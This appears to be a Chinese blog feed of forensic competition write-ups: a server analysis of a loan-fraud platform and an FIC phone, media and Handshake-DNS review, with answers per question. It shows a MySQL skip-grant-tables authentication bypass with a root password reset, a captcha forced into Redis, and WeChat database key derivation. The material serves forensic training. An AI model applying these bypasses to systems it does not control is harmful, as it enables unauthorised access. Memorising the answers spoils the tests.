(2分)</h4><p><code>顺心借</code></p><p>在application-sxj.yaml文件中找到</p><p><img src="/img/image-20250424130222119.png" alt="image-20250424130222119"></p><h4 id="6-对服务器检材进行分析，该网站用于存储大量身份证照的OSS中的AccessKeyID后八位是？（答案格式：按实际值填写）-2分"><a href="#6-对服务器检材进行分析，该网站用于存储大量身份证照的OSS中的AccessKeyID后八位是？（答案格式：按实际值填写）-2分" class="headerlink" title="6.对服务器检材进行分析，该网站用于存储大量身份证照的OSS中的AccessKeyID后八位是？（答案格式：按实际值填写） (2分)"></a>6.对服务器检材进行分析，该网站用于存储大量身份证照的OSS中的AccessKeyID后八位是？（答案格式：按实际值填写） (2分)</h4><p><code>EuZJybzD</code></p><p><strong>OSS</strong>指的是<strong>对象存储服务</strong>（Object Storage Service），它是一种基于对象的云存储服务，允许用户存储和检索大量的数据。对象存储服务与传统的文件存储或块存储不同，它以对象为单位存储数据，每个对象包含数据本身和相关的元数据。</p><p>也在application-sxj.yaml中找到</p><p><img src="/img/image-20250424130428814.png" alt="image-20250424130428814"></p><h4 id="7-对服务器检材进行分析，站点服务器用于消息转发代理工具所使用的端口号是？（填写数字，答案格式：3306）-2分"><a href="#7-对服务器检材进行分析，站点服务器用于消息转发代理工具所使用的端口号是？（填写数字，答案格式：3306）-2分" class="headerlink" title="7.对服务器检材进行分析，站点服务器用于消息转发代理工具所使用的端口号是？（填写数字，答案格式：3306） (2分)"></a>7.对服务器检材进行分析，站点服务器用于消息转发代理工具所使用的端口号是？（填写数字，答案格式：3306） (2分)</h4><p><code>5672</code></p><p><strong>RabbitMQ</strong> 是一个开源的<strong>消息代理（Message Broker）软件</strong>，也称为队列管理器。它允许不同的应用程序通过消息队列进行通信，支持多种协议，最著名的是AMQP（高级消息队列协议）。RabbitMQ被广泛用于解耦应用组件、实现异步处理、流量削峰等场景。</p><p>也在application-sxj.yaml中找到</p><p><img src="/img/image-20250424130707680.png" alt="image-20250424130707680"></p><h4 id="8-对服务器检材进行分析，站点服务器用于启动定时任务的代码片段存在于？（答案格式：LoginIndex-class）-4分"><a href="#8-对服务器检材进行分析，站点服务器用于启动定时任务的代码片段存在于？（答案格式：LoginIndex-class）-4分" class="headerlink" title="8.对服务器检材进行分析，站点服务器用于启动定时任务的代码片段存在于？（答案格式：LoginIndex.class） (4分)"></a>8.对服务器检材进行分析，站点服务器用于启动定时任务的代码片段存在于？（答案格式：LoginIndex.class） (4分)</h4><p><code>MobileStatusTask.class</code></p><p>找到定时任务的代码段：<strong>Cron 表达式（<code>cron</code>）</strong></p><p><img src="/img/image-20250424133344291.png" alt="image-20250424133344291"></p><p>暴力搜索</p><p><img src="/img/image-20250424140508075.png" alt="image-20250424140508075"></p><p><img src="/img/image-20250424140526482.png" alt="image-20250424140526482"></p><h4 id="9-对服务器检材进行分析，站点服务器用于验证用户输入的验证码是否匹配的代码片段存在于？（答案格式：LoginIndex-class）-4分"><a href="#9-对服务器检材进行分析，站点服务器用于验证用户输入的验证码是否匹配的代码片段存在于？（答案格式：LoginIndex-class）-4分" class="headerlink" title="9.对服务器检材进行分析，站点服务器用于验证用户输入的验证码是否匹配的代码片段存在于？（答案格式：LoginIndex.class） (4分)"></a>9.对服务器检材进行分析，站点服务器用于验证用户输入的验证码是否匹配的代码片段存在于？（答案格式：LoginIndex.class） (4分)</h4><p><code>AdminIndexConller.class</code></p><p>暴力搜索</p><p><img src="/img/image-20250424142555030.png" alt="image-20250424142555030"></p><p><img src="/img/image-20250424142627852.png" alt="image-20250424142627852"></p><h4 id="10-对服务器检材进行分析，数据库服务器中Docker容器镜像中mysql的镜像ID号前6位是？（答案格式：123asd）-2分"><a href="#10-对服务器检材进行分析，数据库服务器中Docker容器镜像中mysql的镜像ID号前6位是？（答案格式：123asd）-2分" class="headerlink" title="10.对服务器检材进行分析，数据库服务器中Docker容器镜像中mysql的镜像ID号前6位是？（答案格式：123asd） (2分)"></a>10.对服务器检材进行分析，数据库服务器中Docker容器镜像中mysql的镜像ID号前6位是？（答案格式：123asd） (2分)</h4><p><code>23b013</code></p><p><img src="/img/image-20250424144500406.png" alt="image-20250424144500406"></p><h4 id="11-对服务器检材进行分析，数据库服务器中DockerCompose的版本号是？（答案格式：1-1-1）-2分"><a href="#11-对服务器检材进行分析，数据库服务器中DockerCompose的版本号是？（答案格式：1-1-1）-2分" class="headerlink" title="11.对服务器检材进行分析，数据库服务器中DockerCompose的版本号是？（答案格式：1.1.1） (2分)"></a>11.对服务器检材进行分析，数据库服务器中DockerCompose的版本号是？（答案格式：1.1.1） (2分)</h4><p><code>2.27.1</code></p><p><img src="/img/image-20250423153223351.png" alt="image-20250423153223351"></p><h4 id="12-对服务器检材进行分析，数据库服务器中用于存储后台登录账号的数据表名是？（答案格式：login）-2分"><a href="#12-对服务器检材进行分析，数据库服务器中用于存储后台登录账号的数据表名是？（答案格式：login）-2分" class="headerlink" title="12.对服务器检材进行分析，数据库服务器中用于存储后台登录账号的数据表名是？（答案格式：login） (2分)"></a>12.对服务器检材进行分析，数据库服务器中用于存储后台登录账号的数据表名是？（答案格式：login） (2分)</h4><p><code>sys_user</code></p><p>一开始一直连不上</p><p><img src="/img/image-20250424153015039.png" alt="image-20250424153015039"><br>佬的解释：</p><p><em>这个docker容器好像是通过iptables进行端口映射来的，防火墙一关好像就会导致容器无法启动，不关防火墙又会被拦，添加端口还是检测不到服务器，就非常神奇。</em></p><p>尝试<strong>绕密登录</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#关闭防火墙<br>systemctl stop firewalld<br>#进入Docker 容器，并启动一个交互式的shell<br>docker exec -it mysql8.0.39 bash<br>#在 /etc/my.cnf 文件中找到 [mysqld] 部分，并在其下方追加一行 skip-grant-tables<br>sed -i &#x27;/\[mysqld\]/a skip-grant-tables&#x27; /etc/my.cnf<br>#退出后重启docker<br>systemctl restart docker<br>docker exec -it mysql8.0.39 bash<br>mysql -u root -p  # 不用输入密码，直接两次回车即可<br>#修改权限<br>FLUSH PRIVILEGES;<br>ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;123456&#x27;;<br>#&#x27;%&#x27; 表示这是一个通配符，允许 root 用户从任何主机连接到 MySQL 服务器<br>ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27;;<br>FLUSH PRIVILEGES;<br>exit<br>#删除skip-grant-tables后重启容器（不删除无法正常从外部连接）<br>sed -i &quot;s/skip-grant-tables/ /&quot; /etc/my.cnf<br>#退出后重启docker，即可用navicat连接<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250424155722366.png" alt="image-20250424155722366"></p><h4 id="13-对服务器检材进行分析，后台管理员“xpt-0”所绑定的手机号码是？（答案格式：13001880188）-2分"><a href="#13-对服务器检材进行分析，后台管理员“xpt-0”所绑定的手机号码是？（答案格式：13001880188）-2分" class="headerlink" title="13.对服务器检材进行分析，后台管理员“xpt-0”所绑定的手机号码是？（答案格式：13001880188） (2分)"></a>13.对服务器检材进行分析，后台管理员“xpt-0”所绑定的手机号码是？（答案格式：13001880188） (2分)</h4><p><code>19521510863</code>（见题12）</p><h4 id="14-对服务器检材进行分析，用户首次借款初始额度是？（填写数字，答案格式：1）-2分"><a href="#14-对服务器检材进行分析，用户首次借款初始额度是？（填写数字，答案格式：1）-2分" class="headerlink" title="14.对服务器检材进行分析，用户首次借款初始额度是？（填写数字，答案格式：1） (2分)"></a>14.对服务器检材进行分析，用户首次借款初始额度是？（填写数字，答案格式：1） (2分)</h4><p><code>4000</code></p><p><img src="/img/image-20250424160016574.png" alt="image-20250424160016574"></p><h4 id="15-对服务器检材进行分析，受害者在平台中一共结款了几次？（填写数字，答案格式：1）-2分"><a href="#15-对服务器检材进行分析，受害者在平台中一共结款了几次？（填写数字，答案格式：1）-2分" class="headerlink" title="15.对服务器检材进行分析，受害者在平台中一共结款了几次？（填写数字，答案格式：1） (2分)"></a>15.对服务器检材进行分析，受害者在平台中一共结款了几次？（填写数字，答案格式：1） (2分)</h4><p><code>1857</code></p><p>重构网站：</p><ol><li><p><strong>mysql创建用户sxy</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mysql">docker exec -it mysql8.0.39 bash<br># 输入密码123456<br>mysql -u root -p <br>CREATE USER &#x27;sxy&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;Sxy000**&#x27;;  <br>#对 sxj_prod 数据库中的所有表（.* 表示所有表）<br>GRANT ALL PRIVILEGES ON sxj_prod.* TO &#x27;sxy&#x27;@&#x27;%&#x27;;<br>FLUSH PRIVILEGES;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250424160924519.png" alt="image-20250424160924519"></p></li><li><p><strong>修改host文件</strong></p><p>F12查看网络信息，接受验证码ip（47.96.140.186）不对。如果要成功登录，需要通过system的rabbitMQ接收，并与redis存储验证码数据比较，所以先要修改host，让网络转到system的ip上</p><p><img src="/img/image-20250424164005631.png" alt="image-20250424164005631"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在hosts文件中添加，第一行是rabbitmq服务，第二行是将阿里云的地址映射到本地</span><br><br>192.168.8.134    iZbp1gma2uf9hvsnbu9mdkZ   iZbp1gma2uf9hvsnbu9mdkZ  <span class="hljs-comment">#system</span><br><br>192.168.8.150   rm-bp18td28bsh13f5jy.mysql.rds.aliyuncs.com     <span class="hljs-comment">#data</span><br><span class="hljs-comment">#后台跳转地址转换为本机地址</span><br><span class="hljs-comment">#找到所有 .js 文件，并使用 sed 命令将 47.96.140.186 替换为 192.168.8.134</span><br>find ./ -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*js&#x27;</span> -<span class="hljs-built_in">exec</span> sed -i <span class="hljs-string">&#x27;s/47.96.140.186/192.168.8.134/g&#x27;</span> &#123;&#125; +<br></code></pre></td></tr></table></figure></li><li><p><strong>固定redis验证码</strong></p><p>见题9可知验证方式：将验证码和redisCode进行比较，所以验证码应该是需要存入redis中的</p><p>所以连接redis并添加验证码：<code>1234</code></p><p><img src="/img/image-20250424171401449.png" alt="image-20250424171401449"></p></li><li><p><strong>启动所有服务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start rabbitmq-server<br><span class="hljs-comment">#启动consul，但启动失败</span><br>./root/consul.sh<br><span class="hljs-comment">#启动jar</span><br>java -jar cal-0.0.1-SNAPSHOT.jar --spring.profiles.active=sxj --server.port=8083<br></code></pre></td></tr></table></figure></li></ol><p>开始做题：结款次数，即还款量</p><p><img src="/img/image-20250424213942692.png" alt="image-20250424213942692"></p><h4 id="16-对服务器检材进行分析，该平台中所有下单用户成功完成订单总金额是？（填写数字，答案格式：1）-2分"><a href="#16-对服务器检材进行分析，该平台中所有下单用户成功完成订单总金额是？（填写数字，答案格式：1）-2分" class="headerlink" title="16.对服务器检材进行分析，该平台中所有下单用户成功完成订单总金额是？（填写数字，答案格式：1） (2分)"></a>16.对服务器检材进行分析，该平台中所有下单用户成功完成订单总金额是？（填写数字，答案格式：1） (2分)</h4><p><code>11408100</code></p><p><img src="/img/image-20250424220303609.png" alt="image-20250424220303609"></p><h4 id="17-对服务器检材进行分析，该平台中逾期费率是？（答案格式：1-1）-2分"><a href="#17-对服务器检材进行分析，该平台中逾期费率是？（答案格式：1-1）-2分" class="headerlink" title="17.对服务器检材进行分析，该平台中逾期费率是？（答案格式：1.1） (2分)"></a>17.对服务器检材进行分析，该平台中逾期费率是？（答案格式：1.1） (2分)</h4><p><code>0.1</code></p><p><img src="/img/image-20250424163026459.png" alt="image-20250424163026459"></p><h4 id="18-对服务器检材进行分析，该平台中累计还款总金额是？（填写数字，答案格式：1）-2分"><a href="#18-对服务器检材进行分析，该平台中累计还款总金额是？（填写数字，答案格式：1）-2分" class="headerlink" title="18.对服务器检材进行分析，该平台中累计还款总金额是？（填写数字，答案格式：1） (2分)"></a>18.对服务器检材进行分析，该平台中累计还款总金额是？（填写数字，答案格式：1） (2分)</h4><p><code>10194700</code></p><p><img src="/img/image-20250424220438542.png" alt="image-20250424220438542"></p><h4 id="19-对服务器检材进行分析，该平台总共设置了多少种借款额度？（填写数字，答案格式：1）-2分"><a href="#19-对服务器检材进行分析，该平台总共设置了多少种借款额度？（填写数字，答案格式：1）-2分" class="headerlink" title="19.对服务器检材进行分析，该平台总共设置了多少种借款额度？（填写数字，答案格式：1） (2分)"></a>19.对服务器检材进行分析，该平台总共设置了多少种借款额度？（填写数字，答案格式：1） (2分)</h4><p><code>19</code></p><p>有一条被禁用</p><p><img src="/img/image-20250424214608569.png" alt="image-20250424214608569"></p><h4 id="20-对服务器检材进行分析，该平台一共有多少个借款渠道？（填写数字，答案格式：1）-2分"><a href="#20-对服务器检材进行分析，该平台一共有多少个借款渠道？（填写数字，答案格式：1）-2分" class="headerlink" title="20.对服务器检材进行分析，该平台一共有多少个借款渠道？（填写数字，答案格式：1） (2分)"></a>20.对服务器检材进行分析，该平台一共有多少个借款渠道？（填写数字，答案格式：1） (2分)</h4><p><code>131</code></p><p>总共有140条，打开激活状态（可用的）后有131条</p><p><img src="/img/image-20250424214816988.png" alt="image-20250424214816988"></p><h4 id="21-对服务器检材进行分析，该平台对已完成用户收取了总计多少元服务费，结果精确到整数？（填写数字，答案格式：123）-2分"><a href="#21-对服务器检材进行分析，该平台对已完成用户收取了总计多少元服务费，结果精确到整数？（填写数字，答案格式：123）-2分" class="headerlink" title="21.对服务器检材进行分析，该平台对已完成用户收取了总计多少元服务费，结果精确到整数？（填写数字，答案格式：123） (2分)"></a>21.对服务器检材进行分析，该平台对已完成用户收取了总计多少元服务费，结果精确到整数？（填写数字，答案格式：123） (2分)</h4><p><code>4051915</code></p><p><img src="/img/image-20250424214335478.png" alt="image-20250424214335478"></p>]]></content>
      
      
      <categories>
          
          <category> Forensic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Forensic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024FIC复盘</title>
      <link href="/2025/04/27/2025FIC/"/>
      <url>/2025/04/27/2025FIC/</url>
      
        <content type="html"><![CDATA[<p>密码：3x@9Qm!V8e$vL%6d^Yr5o*C#Nk7h&amp;ZpFbW2sG4jXuD1cO0lTgAqHwRnIzJyM-_+K&#x3D;</p><h1 id="介质取证"><a href="#介质取证" class="headerlink" title="介质取证"></a>介质取证</h1><ol><li></li></ol><p><strong>C</strong></p><ol start="2"><li></li></ol><p><strong>18877332134</strong></p><p>在某个便签中全选</p><p><img src="/img/image-20250427212108189.png" alt="FIC1"></p><ol start="3"><li></li></ol><p><strong>tcgg123456</strong><br>在手机中找到秘钥环，打开google密码管理可以看到</p><p><img src="/img/image-20250427214006248.png" alt="FIC2"></p><ol start="4"><li></li></ol><p><strong>4.0.0.21</strong></p><ol start="5"><li></li></ol><p><strong>AB</strong></p><ol start="6"><li></li></ol><p><strong>sunlogin_service.log.2</strong></p><ol start="7"><li></li></ol><p><strong>116.192.161.222:2577</strong></p><p>received public ip 116.192.161.222:2577</p><ol start="8"><li></li></ol><p><strong>important.docx</strong></p><ol start="9"><li></li></ol><p><strong>solution</strong></p><p>导入火眼发现其中有个文件：<code>important.xml</code>导出后打开发现是jpg文件</p><p><img src="/img/image-20250427214239649.png" alt="FIC3"></p><ol start="10"><li></li></ol><p><strong>自传小说.MP3</strong></p><ol start="11"><li></li></ol><p><strong>A</strong></p><ol start="12"><li></li></ol><p><strong>北京大学</strong></p><ol start="13"><li></li></ol><p><strong>wang</strong></p><ol start="14"><li></li></ol><p><strong>棋牌室</strong></p><ol start="15"><li></li></ol><p><strong>071492</strong></p><p>取每一段音频的<strong>首字</strong>, 拼接起来得到 <code>我得银行密马事凌起一四就而</code> &#x3D; <code>我的银行密码是071492</code>.</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs erlang">我叫李安宏...<br>得到毕业证书后...<br>银色的流星划过天际...<br>行家啊...<br>密聊中...<br>马上我们相约在香格里拉大酒店...<br>事后...<br>凌伍诚(音)便是这这时候...<br>起初...<br>一次次这样...<br>四楼的车库里...<br>就是些交易的场面...<br>而每当这个念头浮现...<br></code></pre></td></tr></table></figure><h1 id="手机"><a href="#手机" class="headerlink" title="手机"></a>手机</h1><ol><li></li></ol><p><strong>Redmi 6 Pro</strong></p><p><img src="/img/image-20250427213304561.png" alt="FIC4"></p><p>也可查IMEI</p><ol start="2"><li></li></ol><p><strong>1qaz2wsx</strong></p><p>在手机备忘录的database中找到</p><p><img src="/img/image-20250427215120141.png" alt="FIC5"></p><ol start="3"><li></li></ol><p><strong>爱能不能够永远单纯没有悲哀</strong></p><p>见题2图片，接头暗号指向一张图片<code>ub690t1mq9kelnah.png</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;note&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;HEADING&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;接头暗号&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;IMAGE&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ub690t1mq9kelnah.png&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CHECKLIST_UNCHECKED&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;说上述暗号&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CHECKLIST_CHECKED&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;地点：香格里拉大酒店大堂&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CHECKLIST_CHECKED&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;黑皮鞋&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CHECKLIST_CHECKED&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;系领带&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;format&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;CHECKLIST_CHECKED&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;穿西装&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>在图片中搜索</p><p><img src="/img/image-20250427215457393.png" alt="FIC6"></p><ol start="4"><li></li></ol><p><strong>1qaz2wsx3edc</strong></p><p>在便签的数据库中找到</p><p><img src="/img/image-20250427215738938.png" alt="FIC7"></p><ol start="5"><li></li></ol><p><strong>2026-02-26</strong></p><ol start="6"><li></li></ol><p><strong>EnMicroMsg.db</strong></p><img src="img/image-20250427220028317.png" alt="FIC8" style="zoom:50%;" /><ol start="7"><li></li></ol><p><strong>1864810197</strong></p><p>打开&#x2F;data&#x2F;com.tencent.mm&#x2F;shared_prefs&#x2F;com.tencent.mm_preferences.xml  看到uin</p><ol start="8"><li></li></ol><p><strong>31ad809</strong></p><ul><li>微信数据库是由设备的IMEI拼接用户UIN计算MD5后，取前7位作为密码</li><li>如果微信在创建数据库时没有获取到 IMEI 信息, 则会使用 <code>1234567890ABCDEF</code> 代替 IMEI. 这种情况下 <code>auth_info_key_prefs.xml</code> 文件中会缺少 IMEI 信息.</li></ul><p>因为本题中微信并没有获取到 IMEI 信息, 因此只用计算 <code>md5(&quot;1234567890ABCDEF&quot;+UIN)</code> 即可.</p><img src="img/image-20250427220601840.png" alt="FIC9" style="zoom:50%;" /><ol start="9"><li></li></ol><p><strong>3170010703</strong></p><p>分析聊天记录可以知道图片里有个电话是解压密码</p><p>查看源文件发现同文件有两张一样的图片，有一张隐约有二维码</p><p><img src="/img/image-20250427223026462.png" alt="FIC10"></p><p>使用stegonline分离一下</p><img src="img/image-20250428130206759.png" alt="FIC11" style="zoom:50%;" /><p>使用QRresearch得到电话（要去掉开头的1）：<code>3170010703</code></p><p><img src="/img/image-20250428130402977.png" alt="FIC12"></p><ol start="10"><li></li></ol><p><strong>83da62aabc88cb1b23e9469142b67b80</strong></p><p><img src="/img/image-20250428131221791.png" alt="FIC13"></p><ol start="11"><li></li></ol><p><strong>#!@KE2sax@!da0h5hghg34&amp;@</strong></p><p><img src="/img/image-20250428131507234.png" alt="FIC14"></p><ol start="12"><li></li></ol><p><strong>李安弘</strong></p><ol start="13"><li></li></ol><p><strong>80000</strong></p><p><img src="/img/image-20250428131925804.png" alt="FIC15"></p><h1 id="互联网（Web3）"><a href="#互联网（Web3）" class="headerlink" title="互联网（Web3）"></a>互联网（Web3）</h1><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p><strong>DNS ( Domain Name Service)</strong> </p><p><strong>DNS Zone</strong>，<strong>DNS域</strong>，被用来划分DNS主域。传统的DNS域类似一个树状的结构，被分成不同的区域，这些区域可区分一个DNS服务器中命名空间中不同的区域。</p><p><strong>常见的资源记录类型</strong>：</p><p><strong>A</strong> ：Address地址， IPv4</p><p><strong>AAAA</strong>：Address地址 IPv6</p><p><strong>NS</strong> ：Name Server域名服务器</p><ul><li>名称服务器（如<code>ns1.varo</code>）是负责管理域名DNS记录的服务器。当用户访问<code>.foren6</code>时，系统会向<code>ns1.varo</code>查询该域名对应的IP地址、子域名、邮箱配置等信息。</li><li>用于确定哪些服务器（注意不是单个服务器）为一个局域网传递DNS信息以及确定域名由哪个服务器进行解析。</li></ul><p><strong>SOA</strong>：Start of Authority 起始授权机构</p><p><strong>MX</strong>：Mail Exchanger 邮件交换</p><p><strong>CNAME</strong>：Canonical Name规范名</p><ul><li>CNAME是DNS记录的一种类型，用于将一个域名（<strong>别名</strong>）指向另一个域名（<strong>规范名</strong>），而非直接指向IP地址。</li></ul><table><thead><tr><th><strong>记录类型</strong></th><th><strong>作用</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>CNAME</strong></td><td>别名 → 规范域名</td><td><code>www</code> → <code>example.com</code></td></tr><tr><td><strong>A</strong></td><td>域名 → IPv4地址</td><td><code>example.com</code> → <code>1.2.3.4</code></td></tr><tr><td><strong>AAAA</strong></td><td>域名 → IPv6地址</td><td><code>example.com</code> → <code>2001:db8::1</code></td></tr><tr><td><strong>MX</strong></td><td>邮件服务器地址</td><td><code>example.com</code> → <code>mail.example.com</code></td></tr><tr><td><strong>TXT</strong></td><td>文本信息（如SPF、DMARC记录）</td><td><code>example.com</code> → <code>&quot;v=spf1...&quot;</code></td></tr></tbody></table><p><strong>PTR</strong>：Pointer 指针，即反向DNS系统，用于查询IP地址时给出相关的域名，即查询IP地址的PTR记录给出该IP指向的域名，在 Zone 文件中被设置；</p><p><strong>TXT</strong>：Text，网络名称系统的记录，可讲文字信息提供给网络意外的来源，其中有一个非常重要的功能就是当外部查询需要显示BIND的相关版本号时，可以指定 TXT查询，这个配置是默认的；谷歌会使用 TXT 记录来验证网站的拥有权以及确保电子邮件的安全；</p><p><strong>SRV</strong>：Service 记录，域名中用于指定服务器并提供服务的位置：主机好、端口号；一般在 Zone File 中被定义；SRV 被用来记录服务器提供什么样的服务。</p><p><strong>FQDN(Fully Qualified Domain Name)</strong> 完全合格域名&#x2F;全程域名，即域名可以通过DNS进行解析，其公式 FQDN &#x3D; HostName + Domain。</p><ul><li>这门技术解决了一个多个主机的问题，一个网站或者服务器集群一般都是有多个主机一起协作的，比如说包括正向代理服务器、反向代理服务器、Web服务器、Email服务器、OA服务器、FTP服务器等等，这个时候就涉及是不是需不需要为每一个主机申请一个域名。 有了这个技术之后每一个主机都可以自己申请一个 <code>Hostname</code> 来区别于其他的主机，这个时候就只需要一个域名就可以做到管理所有的主机。</li><li>比如我申请了一个域名: <code>doheras.com</code><ul><li>现在我有两个服务器需要用到这个域名，一个 FTP服务器，一个Web服务器，这两个服务器都需要用到 <code>doheras.com</code>这个域名，根据公式，我们知道可以采用 <code>hostname</code> 的方式来访问不同的主机：</li><li>Web 服务器: <code>web.doheras.com</code></li><li>FTP 服务器: <code>ftp.doheras.com</code></li><li>因此， FQDN 服务可以简化在服务和应用中的配置流程，提高配置文件的可维护性。</li></ul></li><li>在配置DNS的过程中，因为服务端的工作在UDP协议端口53上，DNS需要FQDN提供正向解析 （FQDN –&gt; IP）以及反向解析 (IP –&gt; FQDN) 的服务。</li></ul><p><strong>SOA( Start of Authority)</strong></p><ul><li>SOA 又被称作 起始授权机构记录， 被标记成在众多NS记录中哪一台是主服务器。</li><li>SOA 记录表示此域名的权威解析服务器地址，当要查询的域名在所有递归解析服务器没有域名的解析缓存时，会回源到请求此域名的SOA 记录，也叫做权威解析记录。</li><li>SOA 作为所有区域文件的强制性记录，他必须是 ZONE 文件中的第一个记录。</li></ul><p>1.请分析检材二，找到李某上游人员陈某博客宣传所用域名为 </p><p><strong>chen.foren6</strong></p><p><img src="/img/image-20250428212404140.png" alt="FIC16"></p><p>2.请分析陈某宣传所用域名，该域名的顶级域名在以下那个区块链注册 </p><p><strong>B</strong></p><p>A.ETH（<a href="https://ens.domains/%EF%BC%89">https://ens.domains/）</a> </p><p>B.HNS（<a href="https://handshake.org/%EF%BC%89">https://handshake.org/）</a> </p><p>3.请分析陈某宣传所用域名的顶级域名的域名解析服务器（DNS）共有几个</p><p><strong>2</strong></p><p>chen.foren6是自定义顶级域名，在namebase（Handshake域名注册平台）中查找DNS域，查到两个NS（域名服务器）</p><p><img src="/img/image-20250428170809526.png" alt="FIC17"></p><p>也可以按照<a href="https://docs.hnsdns.com/dns-resolver/linux/">Linux - HNSDNS documentation</a>修改默认DNS服务器使用dig查询hns解析（kali自带dig）</p><p><img src="/img/image-20250428215504301.png" alt="FIC18"></p><p>4.请分析陈某宣传所用域名的顶级域名的NS1服务器ip为</p><p><strong>45.79.133.98</strong></p><p>可以看到.foren6的CNAME为varo，继续在namebace中查询即可看到ip</p><p><img src="/img/image-20250428212052492.png" alt="FIC19"></p><p>也可用dig查询</p><p><img src="/img/image-20250428215640478.png" alt="FIC20"></p><p>5.请分析陈某宣传所用域名，该域名DNS记录指向邮件服务器域名为</p><p><strong>mail.163.com</strong></p><p><img src="/img/image-20250428220127374.png" alt="FIC21"></p><p>6.请分析陈某宣传所用域名，该域名的txt记录中chen的值为</p><p><strong>fengbaoliejiu</strong></p><p><img src="/img/image-20250428220223869.png" alt="FIC22"></p><p>7.请分析陈某宣传所用域名，该域名DNS记录没有以下那个域名</p><p>A、admin.chen.foren6 B、caidan.chen.foren6 C、fic.chen.foren6 D、hl.chen.foren6</p><p>只有<code>caidan.chen.foren6</code>解析出ip</p><p><img src="/img/image-20250428221226060.png" alt="FIC23"></p><p><img src="/img/image-20250428221256896.png" 